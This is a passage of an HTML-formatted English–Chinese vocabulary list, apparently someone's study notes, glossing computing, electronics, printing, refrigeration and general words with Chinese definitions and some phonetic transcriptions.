style="color:#fe2c24;">console&nbsp;</span>安慰;抚慰;慰藉;(机器、电子设备等的)控制台，操纵台，仪表板</p>  <p><span style="color:#fe2c24;">adapter </span>(电器设备的)转接器，适配器;</p>  <p><span style="color:#fe2c24;">despite&nbsp;</span>即使;尽管;轻蔑,鄙视</p>  <p><span style="color:#fe2c24;">spite&nbsp;</span>恶意，怨恨；</p>  <p>trend,n趋势;趋向;倾向;动态;</p>  <p>tend ,v倾向于，往往会；照顾，护理；</p>  <p>removable可去除的;可取出的;可拆卸的</p>  <p><span style="color:#fe2c24;">norm&nbsp;</span>社会准则，行为规范；标准;常态，平常事物；</p>  <p><span style="color:#fe2c24;">exploit &nbsp;</span>[ɪkˈsplɔɪt]剥削，压榨；利用（……为自己谋利）；运用，发挥；</p>  <p><span style="color:#fe2c24;">emerge</span>浮现;显现;(从隐蔽处或暗处)出现;露出;暴露;</p>  <p><span style="color:#fe2c24;">surge&nbsp;</span>激增，猛增；（风、水等的）奔涌，汹涌；急剧上升;电压，电流）猛增，浪涌；</p>  <p><span style="color:#fe2c24;">adoption</span>(想法、计划、名字等的)采用;收养;领养;(候选人的)选定，推选，推举</p>  <p><span style="color:#fe2c24;">enthusiast &nbsp;</span>[ɪnˈθuːziæst]狂热爱好者;爱好者</p>  <p><span style="color:#fe2c24;">enthusiastic&nbsp;</span>热心的，热情的</p>  <p><span style="color:#fe2c24;">exhausted&nbsp;</span>筋疲力尽的；耗尽的，枯竭的</p>  <p>mainstream主流;主流思想;主流群体</p>  <p>stream流动;流;流出;溪;小河;(液)流;</p>  <p><span style="color:#fe2c24;">abbreviation&nbsp;</span>&nbsp;[əˌbriːviˈeɪʃn]缩写;缩写词;缩略;略语</p>  <p><span style="color:#fe2c24;">encryption</span>加密；加密（技）术</p>  <p><span style="color:#fe2c24;">shed&nbsp;</span>摆脱，去除;使落下，使掉下;棚，小屋;简易房（用于贮藏物品），货棚</p>  <p><span style="color:#fe2c24;">perceptible&nbsp;</span>[pərˈseptəb(ə)l]可察觉的;可感知的;可察觉到的</p>  <p><span style="color:#fe2c24;">discard</span>丢弃;抛弃</p>  <p><span style="color:#fe2c24;">redundant</span>冗余的;多余的</p>  <p><span style="color:#fe2c24;">aggressive</span>侵略性的;好斗的;侵略的;挑衅的</p>  <p><span style="color:#fe2c24;">feasible</span>可行的;行得通的</p>  <p><span style="color:#fe2c24;">adjacent</span>相邻;邻近的;与…毗连的</p>  <p><span style="color:#fe2c24;">spatial&nbsp;</span>空间的，与空间有关的；</p>  <p><span style="color:#fe2c24;">temporal&nbsp;</span>&nbsp;[ˈtempərəl]世俗的;时间的;世间的</p>  <p><span style="color:#fe2c24;">artefact</span>工艺品;人工制品;手工艺品(尤指有历史或文化价值的)</p>  <p><span style="color:#fe2c24;">artificial&nbsp;</span>人造的，人工的；人为的；不真挚的，矫揉造作的</p>  <p>coefficient (测定物质某种特性的)系数</p>  <p><span style="color:#fe2c24;">quantisation&nbsp;</span>量子化</p>  <p><span style="color:#fe2c24;">eject&nbsp;</span>驱逐，逐出，排斥;弹出</p>  <p>least最小的;最少的;最小;最少;微不足道</p>  <p>percent百分比，百分之…;部分</p>  <p><span style="color:#fe2c24;">jettison</span>抛弃;(为减轻重量而从行驶的飞机或船上)扔弃，丢弃</p>  <p><span style="color:#fe2c24;">prospect</span>展望;前景;前途;可能性;</p>  <p>affordable 便宜的，买得起的;价格合理的;</p>  <p><span style="color:#fe2c24;">massive</span>大量的，巨大的，大规模的;</p>  <p><span style="color:#fe2c24;">mansion</span>公馆;宅第;大厦;用于公寓楼名</p>  <p><span style="color:#fe2c24;">corporation</span>公司;法人;法人团体;</p>  <p><span style="color:#fe2c24;">cooperation</span>合作;协作;协助;配合</p>  <p><span style="color:#fe2c24;">unveil</span>揭幕;揭开…上的覆盖物;拉开…的帷幔;</p>  <p>reveal&nbsp;揭示，透露；表明，证明；展示，显示；</p>  <p><span style="color:#fe2c24;">obviate&nbsp;</span>排除；避免；消除</p>  <p><span style="color:#fe2c24;">mosaic&nbsp;</span>[moʊˈzeɪɪk]马赛克;镶嵌图案</p>  <p>pattern图案;模式;方式;范例;</p>  <p>freeware免费软件</p>  <p><span style="color:#fe2c24;">shareware</span>共享软件(供买前试用)</p>  <p><span style="color:#fe2c24;">firmware</span>固化程序</p>  <p>sine wave正弦波</p>  <p><span style="color:#fe2c24;">square </span>wave方波、矩形波</p>  <p><span style="color:#fe2c24;">square&nbsp;</span>正方形的，四方形的；成直角的；正方形，正方形物；广场；平方，二次幂；</p>  <p><span style="color:#fe2c24;">triangle </span>wave三角波</p>  <p><span style="color:#fe2c24;">triangle </span>三角形；三角形物体；</p>  <p>wavelength波长;(广播电台等占用的)频道，波道</p>  <p>half wave半波</p>  <p>full wave全波</p>  <p>half cycle半周期;半循环;半个周期</p>  <p><span style="color:#fe2c24;">sinusoid</span>正弦波;正弦曲线</p>  <p>sinusoidal正弦曲线</p>  <p><span style="color:#fe2c24;">waveform</span>波形</p>  <p><span style="color:#fe2c24;">inherent</span>固有的;内在的</p>  <p><span style="color:#fe2c24;">inherit&nbsp;</span>继承（遗产）；经遗传获得（品质、身体特征等）；接手，承担；接收（前所有者的事物）</p>  <p><span style="color:#fe2c24;">render&nbsp;</span>使成为，使处于某种状态；给予，提供；渲染</p>  <p><span style="color:#fe2c24;">intentionally</span>故意;有意地;蓄意地</p>  <p><span style="color:#fe2c24;">intention&nbsp;</span>意图，目的，打算；</p>  <p><span style="color:#fe2c24;">blur </span>模糊不清的事物；模糊的记忆，记不清的事情；污迹;(使)变得模糊不清;(使)视线模糊;(使)看不清;</p>  <p>layer层;表层;层次;阶层</p>  <p>stack堆<span style="color:#fe2c24;">栈</span>;(通常指码放整齐的)一叠，一摞，一堆;</p>  <p>heap&nbsp;（凌乱的）一<span style="color:#fe2c24;">堆</span>；许多，大量；</p>  <p><span style="color:#fe2c24;">stock</span>股票;股份</p>  <p><span style="color:#fe2c24;">share&nbsp;</span>共享，合用；分享；分配；分担（责任），分摊（费用）；股份，股票；（共有财产的）部分所有权；责任，贡献；份额；</p>  <p><span style="color:#fe2c24;">wireless</span>无线的</p>  <p><span style="color:#fe2c24;">co-worker</span>同事;共同工作者;合作者;同僚</p>  <p><span style="color:#fe2c24;">colleague </span>&nbsp;[ˈkɑːliːɡ]同事，同僚</p>  <p><span style="color:#fe2c24;">college&nbsp;</span>&nbsp;[ˈkɑːlɪdʒ]大学，专科学校；学院，分院；</p>  <p>university&nbsp;大学，综合性大学；</p>  <p>videoconference视频会议;</p>  <p>downside &nbsp;缺点，不利方面</p>  <p>virus病毒</p>  <p>viruses病毒(复数)</p>  <p>virtual&nbsp;虚拟的，模拟的；（光学）虚的，虚拟的；</p>  <p>fixed-price固定总价;固定价格</p>  <p><span style="color:#fe2c24;">telephony</span>电话通讯</p>  <p><span style="color:#fe2c24;">bundle</span>捆;(一)包;(一)扎;额外免费提供(设备等);(尤指出售计算机时)赠送(软件)</p>  <p>route路线;路途;</p>  <p><span style="color:#fe2c24;">extra&nbsp;</span>&nbsp;[ˈekstrə]额外的;分外的;外加的;附加的;额外的事物;另外收费的事物;</p>  <p><span style="color:#fe2c24;">bill</span>账单;(提交议会讨论的)议案，法案;</p>  <p><span style="color:#fe2c24;">fee</span>费用;专业服务费;咨询费;报酬;</p>  <p><span style="color:#fe2c24;">recipient&nbsp;</span>收件人;接受者;受方</p>  <p><span style="color:#fe2c24;">spam</span>垃圾邮件;</p>  <p><span style="color:#fe2c24;">perpetrate&nbsp;</span>犯（罪）；做（恶）</p>  <p><span style="color:#fe2c24;">anti-virus</span>（软件）杀毒的，防病毒的</p>  <p>participant参与者;参加者</p>  <p><span style="color:#fe2c24;">deliver </span>投递，运送；交付;发表;发布（计算机程序）;接生，分娩；</p>  <p><span style="color:#fe2c24;">release&nbsp;</span>释放，放走；公布，发布；发行，上映；解除（职务或工作），解雇；</p>  <p>guest客人;宾客;旅客;房客;特别嘉宾;</p>  <p>client客户;当事人;委托人;(连接在服务器上的)客户机</p>  <p>server服务器;&lt;美&gt;服务生，服务员；发球者;</p>  <p>multipoint多点；多点的；多位置的</p>  <p><span style="color:#fe2c24;">collaboration&nbsp;</span>&nbsp;[kəˌlæbəˈreɪʃ(ə)n]协作;合作;合作成果(或作品);</p>  <p><span style="color:#fe2c24;">evolve</span>发展;进化;(使)逐渐形成;逐渐演变</p>  <p><span style="color:#fe2c24;">dedicate&nbsp;</span>致力于，献身于；把（书、戏剧、音乐作品等）献给；</p>  <p><span style="color:#fe2c24;">perspective&nbsp;</span>（观察问题的）视角，观点；透视（画）法；（几何）透视关系;景观，远景；角度；</p>  <p><span style="color:#fe2c24;">doubly</span>更加;越发;倍加;在两方面;由于双重原因</p>  <p><span style="color:#fe2c24;">confusing</span>令人困惑;难以理解的;不清楚的</p>  <p>mumbo-jumbo胡言乱语</p>  <p>markup加成;标记，标记符号</p>  <p>hyper&nbsp;&lt;非正式&gt;（行为）兴奋的，紧张的</p>  <p><span style="color:#fe2c24;">headline</span>(报纸的)大字标题;(电视或无线电广播的)新闻摘要</p>  <p><span style="color:#fe2c24;">apartment</span>公寓;(通常指在同一楼层的)公寓套房;</p>  <p>rent租金，租费;地租;房租;租用，租借（房屋、土地、机器等）</p>  <p>hexagon六角形;六边形</p>  <p>chop切碎;剁碎;砍;劈;</p>  <p><span style="color:#fe2c24;">extension&nbsp;</span>延伸，扩展；展期，延长期；扩建部分，延伸部分；</p>  <p><span style="color:#fe2c24;">expansion&nbsp;&nbsp;</span>扩大，扩张；扩充，展开；扩张物；膨胀</p>  <p>extensively广大地；广泛地</p>  <p><span style="color:#fe2c24;">intricate</span>错综复杂的</p>  <p>calculation计算;估计;预测;推测;</p>  <p>take&nbsp;apart拆开</p>  <p><span style="color:#fe2c24;">manipulation</span>操纵;操作法;管理措施;操作处理;</p>  <p>housekeeping&nbsp;家务管理；家用开支；总务部，后勤部；内务处理；</p>  <p><span style="color:#fe2c24;">chore&nbsp;</span>家庭杂务，杂活；累活，苦差事</p>  <p><span style="color:#fe2c24;">coordinate &nbsp;</span>[koʊˈɔːrdɪneɪt]协调，配合；使身体协调；（使颜色、款式、风格等）搭配，配套；坐标;地位相当的，同等重要的；</p>  <p><span style="color:#fe2c24;">coordination&nbsp;</span>&nbsp;[koʊˌɔːrdɪˈneɪʃ(ə)n]协作;协调;配合;</p>  <p><span style="color:#fe2c24;">customizable &nbsp;</span>[ˈkʌstəmaɪzəbl]可定制;可定制的;</p>  <p>internal里面的;体内的;内部的;</p>  <p><span style="color:#fe2c24;">palm </span>手掌，手心；（手套的）掌部；棕榈树</p>  <p>quad-band四波段;四频段;四频</p>  <p><span style="color:#fe2c24;">hotspot</span>热点;喧嚣之地;热闹的娱乐场所;</p>  <p>plot&nbsp;阴谋，密谋；情节；</p>  <p>spot&nbsp;地点，场所；点，斑点；污点，污渍；（皮肤上的）丘疹，疱疹；</p>  <p>pot&nbsp;（烹饪所用圆而深的）锅；（盛食品的）罐，瓶，壶</p>  <p><span style="color:#fe2c24;">innovative&nbsp;</span>创新的;引进新思想的;采用新方法的;革新的</p>  <p><span style="color:#fe2c24;">innovation&nbsp;</span>&nbsp;[ˌɪnəˈveɪʃ(ə)n]新事物，新方法；革新，创新</p>  <p>slide滑动;(使)滑行;滑梯;降低;跌落;衰落;</p>  <p>keypad(用于操作电话、电视等的)小键盘;(电话)按键;(计算机)辅助键盘</p>  <p>keyboard(计算机或打字机的)键盘;(钢琴或其他乐器的)琴键;键盘式电子乐器</p>  <p>quality质量;品质;</p>  <p><span style="color:#fe2c24;">evaporation</span>蒸发，挥发，汽化</p>  <p><span style="color:#fe2c24;">evaporate</span>蒸发;(使)挥发;(逐渐)消失;衰减</p>  <p><span style="color:#fe2c24;">evaporator</span>蒸发器；汽化器</p>  <p>rubbing拓本;擦;磨;搓;</p>  <p><span style="color:#fe2c24;">alcohol</span>含酒精饮料;酒;酒精;乙醇</p>  <p>freeze冻结;冰冻;(使)结冰;</p>  <p><span style="color:#fe2c24;">serpentine</span>蜿蜒的;弯弯曲曲的;盘旋的;</p>  <p><span style="color:#fe2c24;">ammonia</span>氨;氨水</p>  <p><span style="color:#fe2c24;">Ozone</span>臭氧;臭氧消毒;纯氧;臭氧层;</p>  <p><span style="color:#fe2c24;">freon</span>氟利昂</p>  <p>propane丙烷</p>  <p>hydrogen氢;氢气</p>  <p><span style="color:#fe2c24;">Celsius&nbsp;</span>&nbsp;[ˈselsiəs]摄氏的;摄氏</p>  <p><span style="color:#fe2c24;">fahrenheit</span>华氏的;华氏温度计的</p>  <p><span style="color:#fe2c24;">dissipate</span>消散;驱散;(使)消失;挥霍;浪费;消磨(时间、金钱等)</p>  <p><span style="color:#fe2c24;">pressurization &nbsp;</span>[ˌpreʃərəˈzeɪʃn]加压控制;加压;增压;</p>  <p><span style="color:#fe2c24;">condense</span>压缩;(由气体)冷凝;(使气体)凝结;(使)浓缩;</p>  <p><span style="color:#fe2c24;">condenser</span>冷凝器</p>  <p><span style="color:#fe2c24;">coolant</span>冷却剂(用于发动机、核反应堆等)</p>  <p>separator分离器;</p>  <p>zone区;(有某特色或作用的)地区;(规划的)区域;分区;</p>  <p><span style="color:#fe2c24;">toxic</span>有毒的;毒物;毒剂</p>  <p>pose姿势</p>  <p><span style="color:#fe2c24;">threat</span>威胁;恐吓;</p>  <p>leak漏;渗漏;泄漏;</p>  <p><span style="color:#fe2c24;">air conditioner</span>空调机;空调设备</p>  <p>lightweight oil轻质油</p>  <p><span style="color:#fe2c24;">lubricate</span>润滑;给…上润滑油;上油于</p>  <p>waveguide波导管</p>  <p><span style="color:#fe2c24;">chamber</span>室;会议厅;(议会的)议院;</p>  <p>cage笼子</p>  <p>cave山洞;洞穴</p>  <p><span style="color:#fe2c24;">cavity</span>孔;窟窿;腔;(龋齿的)洞</p>  <p><span style="color:#fe2c24;">resonance</span>洪亮;响亮;共鸣;共振;谐振;</p>  <p>reason</p>  <p><span style="color:#fe2c24;">gigahertz</span>千兆赫兹</p>  <p>faraday法拉第</p>  <p><span style="color:#fe2c24;">shield</span>盾(牌);保护人;保护物;掩护物;屏障;保护，保卫；遮挡；给……加防护罩；防止（或减少）辐射；</p>  <p><span style="color:#fe2c24;">concern</span>涉及;影响，牵涉(某人);关心;(尤指许多人共同的)担心，忧虑;</p>  <p><span style="color:#fe2c24;">disrupt</span>扰乱;打乱;使中断;</p>  <p><span style="color:#fe2c24;">continuous</span>不断的;持续的;连续的;延伸的;</p>  <p>kerosene煤油</p>  <p>upward向上的;朝上的;向高处的;</p>  <p>downward向下地;向下的;下降的</p> </blockquote> <blockquote>  <p><span style="color:#fe2c24;">patent</span>专利;专利权;专利证书<br><span style="color:#fe2c24;">passageway</span>走廊;通道;过道</p>  <p>passage&nbsp;（书、演讲、乐曲等的）段，章；（人生或体育赛事等中的）阶段；过道，走廊；（人群等中的）通道，通路；</p>  <p>mouse鼠;耗子;鼠标;</p>  <p>mice,mouse 的复数</p>  <p><span style="color:#fe2c24;">realm&nbsp;</span>（知识、活动、思想的）领域，范围；&lt;正式&gt;王国；</p>  <p>printer打印机(尤指与计算机相连的);印刷商;印刷工人;印刷公司;印刷厂</p>  <p>typewriter打字机</p>  <p><span style="color:#fe2c24;">rubber</span>橡胶;橡皮;</p>  <p><span style="color:#fe2c24;">membrane</span>(身体内的)膜;(植物的)细胞膜;</p>  <p><span style="color:#fe2c24;">sheet</span>床单;被单;一张(通常指标准尺寸的纸);薄片，薄板(多指正方形或长方形的);</p>  <p><span style="color:#fe2c24;">bump</span>碰撞;(无意地)碰，撞;</p>  <p><span style="color:#fe2c24;">displacement 被迫迁徙，流亡；取代;移位;替代;</span></p>  <p><span style="color:#fe2c24;">displace 置换;取代;替代;使（人或动物群体）离开家园；移动，转移</span></p>  <p>replace代替;取代;更换;</p>  <p><span style="color:#fe2c24;">layout</span>布局;布置;设计;安排</p>  <p>natural自然的;天然的;正常的;</p>  <p><span style="color:#fe2c24;">accustomed&nbsp;</span>&nbsp;[əˈkʌstəmd]习惯的;惯常的;通常的；习惯于;</p>  <p><span style="color:#fe2c24;">formation</span>组成;形成;组成物;</p>  <p>cursor(计算机荧光屏上的)光标，游标</p>  <p>commonest最常见的;通常的;普遍的</p>  <p>roller滚筒</p>  <p>inkjet&nbsp;喷墨；喷墨打印机</p>  <p>ink墨水;油墨;墨汁</p>  <p>ink cartridge打印机墨盒;油墨盒</p>  <p><span style="color:#fe2c24;">examine</span>检查;审查;考察;考查;调查;</p>  <p><span style="color:#fe2c24;">dirt &nbsp;</span>[dɜːrt]污物，灰尘;泥土，松土;下流话</p>  <p>dirty&nbsp;肮脏的；下流的；卑鄙的，不诚实的；暗淡的；</p>  <p><span style="color:#fe2c24;">definitive&nbsp;</span>&nbsp;[dɪˈfɪnətɪv]最终的，确定的；最好的，最权威的；</p>  <p><span style="color:#fe2c24;">droplet </span>液滴;小滴</p>  <p>nozzle管口;</p>  <p><span style="color:#fe2c24;">spray</span>喷雾;喷剂;浪花;喷雾器;喷;喷洒;向…喷洒;</p>  <p>stick粘贴;戳;粘住;</p>  <p>joystick(电脑游戏的)游戏杆，操纵杆，控制杆;(飞机的)操纵杆</p>  <p>thundercloud雷雨云</p>  <p><span style="color:#fe2c24;">dispense&nbsp;</span>分配;分发;</p>  <p>tray&nbsp;托盘，碟；文件盘，公文格；</p>  <p><span style="color:#fe2c24;">canon&nbsp;</span>&lt;正式&gt;准则，标准；教规，宗教法规；</p>  <p>Canon佳能</p>  <p>surprisingly惊人地;令人惊讶地;出乎意料地</p>  <p>dryer烘干机;脱水机;干燥机</p>  <p>bolt(门窗的)闩，插销;螺栓;</p>  <p>boil煮;煮沸;(使)沸腾</p>  <p>cling附着于;附着;</p>  <p><span style="color:#fe2c24;">phenomenon&nbsp;</span>&nbsp;[fəˈnɑːmɪnən]现象;杰出的人;非凡的人(或事物)</p>  <p><span style="color:#fe2c24;">revolve</span>（使）转动，（使）旋转;（使）绕转;旋转;绕转;循环</p>  <p>corona 光晕</p>  <p><span style="color:#fe2c24;">powder</span>粉;粉末;细面;扑面粉;美容粉</p>  <p><span style="color:#fe2c24;">flour&nbsp;</span>&nbsp;[ˈflaʊər](尤指小麦的)面粉;(谷物磨成的)粉</p>  <p>toner(打印机或复印机使用的)墨粉;护肤霜;爽肤水</p>  <p><span style="color:#fe2c24;">affix</span>附上;贴上;粘上</p>  <p><span style="color:#fe2c24;">fuse </span>保险丝;熔断器;导火线;导火索;熔合，结合；&lt;英&gt;（使保险丝熔断而）停止工作；在（电路或电器）中安装保险丝；装引信（或导火索）于（炸弹，炮弹，地雷）；（使）熔化</p>  <p><span style="color:#0d0016;">fuser</span>熔断器;保险丝</p>  <p><span style="color:#fe2c24;">fiber</span>（动植物的）纤维;纤维质</p>  <p>stylus触笔;(唱机的)唱针;指示笔(在电脑屏幕上书写、画画等用)</p>  <p>whereby由此;借以;凭此;</p>  <p>kiosk(出售报纸、饮料等的)小亭;售货亭;报刊亭;公用电话亭</p>  <p><span style="color:#fe2c24;">intimidate&nbsp;</span>&nbsp;[ɪnˈtɪmɪdeɪt]恐吓;威胁</p>  <p><span style="color:#fe2c24;">novice&nbsp;</span>&nbsp;[ˈnɑːvɪs]新手;初学者;初学修士(或修女);</p>  <p><span style="color:#fe2c24;">audience</span>观众;(戏剧、音乐会或演讲等的)听众;(同一事物的)读者;</p>  <p><span style="color:#fe2c24;">retail</span>，n零售，零卖;v零售；以……价格销售；</p>  <p>overall全面的;综合的;总体的</p>  <p><span style="color:#fe2c24;">keystroke</span>击键;按键</p>  <p>workspace(办公室等的)工作场所;(计算机网络的)工作区</p>  <p><span style="color:#fe2c24;">conceal</span>隐藏;隐瞒;掩盖</p>  <p>bezel 挡板</p>  <p>invisible 看不见的;隐形的;无形的</p>  <p><span style="color:#fe2c24;">abrade </span>擦伤(皮肤等);磨损(岩石等)</p>  <p>overlie 躺在……上面；压在……身上（使窒息而死）</p>  <p><span style="color:#fe2c24;">overlay&nbsp;</span>覆盖;包;铺;套图透明膜；覆盖图；覆盖物，涂层；覆盖；</p>  <p><span style="color:#fe2c24;">vulnerable </span>[ˈvʌlnərəb(ə)l]脆弱的;(身体上或感情上)易受…伤害的</p>  <p><span style="color:#fe2c24;">vandalism&nbsp;&nbsp;</span>[ˈvændəlɪzəm]故意破坏（或损坏）财产的行为；（对好事物的）糟蹋</p>  <p><span style="color:#fe2c24;">tolerant</span>宽容的;容忍的;忍受的;</p>  <p>shock震惊;休克;惊愕;令人震惊的事;</p>  <p>shake摇(出);摇动;抖动;(使)颤动;抖(掉);摇头;</p>  <p><span style="color:#fe2c24;">vibration</span>振动;震动;颤动;抖动;</p>  <p><span style="color:#fe2c24;">spectrum </span>谱;光谱;声谱;波谱;频谱;</p>  <p>pioneer先锋，先驱，带头人;开发者，拓荒者;先锋队队员;</p>  <p><span style="color:#fe2c24;">mono </span>单声道的；单色的</p>  <p>intermediate中间的;中级的;</p>  <p>intermediary中介的;中间人的;</p>  <p><span style="color:#fe2c24;">magenta</span>洋红;品红;品红染料</p>  <p>cyan蓝绿色，青色(用于印刷)</p>  <p><span style="color:#fe2c24;">durability</span>耐久性;耐久（用）性</p>  <p><span style="color:#fe2c24;">durable&nbsp;</span>持久的，耐用的；&lt;非正式&gt;（人）有耐力的，坚韧不拔的</p>  <p><span style="color:#fe2c24;">smudge </span>污迹;(模糊的)污痕</p>  <p><span style="color:#fe2c24;">muddy&nbsp;</span>泥泞的，多泥的；含泥的，浑浊的；灰暗的，暗淡的</p>  <p><span style="color:#fe2c24;">fade</span>褪色;凋谢;逐渐消失;淡入，淡出;</p>  <p><span style="color:#fe2c24;">gloss</span>光泽;(平滑表面上的)光亮;</p>  <p>actual真实的;实际的;</p>  <p>heavily沉重地;在很大程度上;</p>  <p>verilog硬件描述语言;测试;</p>  <p><span style="color:#fe2c24;">scenario &nbsp;</span>[səˈnærioʊ]设想，可能发生的情况 ；（电影、戏剧等的）剧情梗概；（艺术或文学作品中的）场景</p>  <p><span style="color:#fe2c24;">generic</span>通用的;一般的;普通的;</p>  <p><span style="color:#fe2c24;">propagation&nbsp;</span>&nbsp;[ˌprɑːpəˈɡeɪʃn]（动植物等的）繁殖，增殖，；（观点、理论等的）传播；（运动、光线、声音等的）传送</p>  <p><span style="color:#fe2c24;">workbench</span>工作台</p>  <p><span style="color:#fe2c24;">occupy</span>占据;使用，占用（空间、面积、时间等）;</p>  <p><span style="color:#fe2c24;">animation&nbsp;</span>活力，生气，热烈；动画片，动画游戏；动画制作</p>  <p><span style="color:#fe2c24;">narration&nbsp;</span>叙述，讲故事；（电影、戏剧等中的）旁白，解说</p>  <p>projector&nbsp;放映机，投影仪；探照灯；计划者，规划者</p>  <p>fast-paced快步调的，快节奏的</p>  <p><span style="color:#fe2c24;">dissolve&nbsp;</span>解散，解除；消失；（以化学手段）除去，分散；（使）溶解 n. （电影中）（画面的）叠化，淡入淡出</p>  <p>soundtrack原声带;(电影的)声迹，声带</p>  <p><span style="color:#fe2c24;">trigger&nbsp;</span>触发;引起;发动;开动;起动</p>  <p><span style="color:#fe2c24;">scramble </span>(迅速而吃力地)爬，攀登;争抢;抢占;争夺;</p>  <p><span style="color:#fe2c24;">spontaneously&nbsp;</span>自发地;自然;自动;自然地</p>  <p>reactive反应的;有反应的;回应的;能起化学反应的;易反应的</p>  <p><span style="color:#fe2c24;">incorporate&nbsp;</span>合并;包含;</p>  <p><span style="color:#fe2c24;">linguistic </span>语言的;语言学的</p>  <p><span style="color:#fe2c24;">sonic&nbsp;</span>声音的;音速的</p>  <p>classify将…分类;将…归类;划分;界定;</p>  <p>classified（信息或文件）机密的;保密的;&lt;口&gt;秘密的;分类的;归类的;</p>  <p>encyclopedia百科全书;(某一学科的)专科全书;</p>  <p><span style="color:#fe2c24;">census</span>(官方的)统计;人口普查;人口调查</p>  <p>atlas地图册;地图集</p>  <p><span style="color:#fe2c24;">diversity&nbsp;</span>差异(性);不同(点);多样性;多样化</p>  <p><span style="color:#fe2c24;">auditory&nbsp;</span>听的;听觉的</p>  <p><span style="color:#fe2c24;">motivate</span>激励;成为…的动机;</p>  <p><span style="color:#fe2c24;">personnel</span>（组织或军队中的）全体人员</p>  <p><span style="color:#fe2c24;">trainee</span>练习生;实习生;</p>  <p>clip夹子;夹住;别住;</p>  <p><span style="color:#fe2c24;">catalogue</span>目录;目录簿;</p>  <p><span style="color:#fe2c24;">stockholder</span>股票持有人;股东</p>  <p>pitch抛;投球;用力扔;投;</p>  <p><span style="color:#fe2c24;">presenter</span>(广播、电视)节目主持人;演讲人;发言人;</p>  <p><span style="color:#fe2c24;">reinforce</span>加强;充实;使更强烈;加固;</p>  <p><span style="color:#fe2c24;">enliven</span>活跃;使更有生气(或活力)</p>  <p><span style="color:#fe2c24;">engage&nbsp;</span>雇用，聘请；参加，从事；</p>  <p><span style="color:#fe2c24;">captivate</span>迷住;使着迷</p>  <p><span style="color:#fe2c24;">vivid&nbsp;</span>生动的;逼真的;鲜明的;</p>  <p><span style="color:#fe2c24;">elaborate</span>复杂的;详尽的;</p>  <p>reward奖励;回报;报酬;</p>  <p>overcome克服;解决;战胜;</p>  <p><span style="color:#fe2c24;">evil&nbsp;</span>恶毒的;邪恶的;有害的;道德败坏的;</p>  <p>outwit 瞒骗；以智取胜</p>  <p><span style="color:#fe2c24;">opponent</span>对手;竞争者;反对者;阻止者</p>  <p>vicarious替代的;间接感受到的</p>  <p>cityscape城市景象，城市风光;城市风光画</p>  <p>dolby杜比;杜比降噪系统</p>  <p>surround围绕;环绕;(使)包围，围住;</p>  <p><span style="color:#fe2c24;">subtitle</span>(电影或电视上的)字幕;副标题;小标题</p>  <p><span style="color:#fe2c24;">thickness</span>厚;厚度;粗;层</p>  <p><span style="color:#fe2c24;">silk</span>(蚕)丝;丝织物，丝绸，丝线;丝绸衣服;</p>  <p>nonreadable不可读的</p>  <p>writable可写的</p>  <p>double-sided双面的；有两面的；两面派的</p>  <p>disc圆盘;圆片;(计算机)磁盘，磁碟;</p>  <p>spiral螺旋形的;螺旋式的</p>  <p>billionth十亿分之一</p>  <p><span style="color:#fe2c24;">elongate</span>(使)变长，伸长;拉长</p>  <p><span style="color:#fe2c24;">shine</span>闪耀，发光;照耀;反光;光泽;光亮;</p>  <p>textbook教科书;课本;教材</p>  <p>hand-on动手做;动手;手把手</p>  <p><span style="color:#fe2c24;">budget&nbsp;</span>&nbsp;[ˈbʌdʒɪt]预算;政府的年度预算</p>  <p><span style="color:#fe2c24;">gear&nbsp;</span>排挡;齿轮;传动装置;挡;换挡;</p>  <p><span style="color:#fe2c24;">freshman</span>大一新生;(大学)一年级新生;</p>  <p><span style="color:#fe2c24;">assignment&nbsp;</span>作业，任务；（工作等的）分配，指派；（财产、权利的）转让</p>  <p><span style="color:#fe2c24;">fairly&nbsp;</span>相当地;一定地;公平合理地;公正地;</p>  <p><span style="color:#fe2c24;">mundane&nbsp;</span>单调的;平凡的</p>  <p><span style="color:#fe2c24;">unsurpassed&nbsp;</span>无比的;卓绝的;出类拔萃的</p>  <p>consequence结果;后果;重要性</p>  <p><span style="color:#fe2c24;">consolidation</span>巩固;（企业、诉讼和诉讼人的）合并;加强;联合;变坚固;</p>  <p><span style="color:#fe2c24;">random</span>随机的，随意的;</p>  <p><span style="color:#fe2c24;">addressability</span>可编址性;可寻址性;可寻址;</p>  <p><span style="color:#fe2c24;">primarily</span>主要地;根本地</p>  <p>appearance外貌;外观;外表;</p>  <p>directx硬件</p>  <p>revision修订;复习;</p>  <p>release释放;放出;放走;公开;发行;发布;</p>  <p>playback录音(或录像、电话留言等的)播放;(播放的)录音，录像</p>  <p>flatbed平板车;平板拖车</p>  <p><span style="color:#fe2c24;">compliant&nbsp;</span>服从的，顺从的；（与规定或标准）符合的，一致的；</p>  <p>iconized图像化</p>  <p>taskflow任务流</p>  <p><span style="color:#fe2c24;">batch</span>一批;(食物、药物等)一批生产的量;批;分批处理</p>  <p>session一场;一节;一段时间;会议，会期;学年;</p>  <p>lid盖子;(容器的)盖</p>  <p><span style="color:#fe2c24;">combo&nbsp;</span>混合物;</p>  <p>tool bar 工具栏</p>  <p><span style="color:#fe2c24;">submenu&nbsp;</span>二级菜单;菜单;子选单;子功能表;子菜单</p>  <p><span style="color:#fe2c24;">default&nbsp;</span>不履行，违约;欠缺， 缺乏;缺席;弃权</p>  <p><span style="color:#fe2c24;">dialog&nbsp;</span>对话;会话</p>  <p>button (机器的)按钮;纽扣;扣子;</p>  <p>midtone 中间调;中间色调</p>  <p>drag 拖，拽;</p>  <p>scroll 纸卷;(供书写的)长卷纸，卷轴;</p>  <p>timer 计时器;跑表;定时器</p>  <p><span style="color:#fe2c24;">microsecond </span>微秒;百万分之一秒</p>  <p><span style="color:#fe2c24;">astable </span>不稳定的；非稳定式的；不定的</p>  <p><span style="color:#fe2c24;">monostable </span>单稳态的</p>  <p>duty cycle占空比;占空因数；占空度；</p>  <p>accurate精确的;正确无误的;准确的</p>  <p>interval 间隔;(时间上的)间隙;间歇;</p>  <p>independently 独立地；自立地;无关地</p>  <p><span style="color:#fe2c24;">threshold </span>门槛;门口;阈;界;</p>  <p>characterize 描述，刻画；成为……的特征，是……的典型</p>  <p><span style="color:#fe2c24;">military</span>军事的;军队的;武装的</p>  <p>reference参考，参照，查阅;引文，引用的观点，参考章节，引证;</p>  <p>guarantee保证;担保;保修单;保用证书;</p>  <p>voltage reference参考电压</p>  <p>cover letter求职信</p>  <p>resume简历;摘要;概述;概要；重新开始;(中断后)继续;恢复</p>  <p>good fit适合;称身</p>  <p>invite邀请;(正式)邀请，请求，要求</p>  <p>cooperative合作的;协作的;同心协力的;协助的;配合的;</p>  <p><span 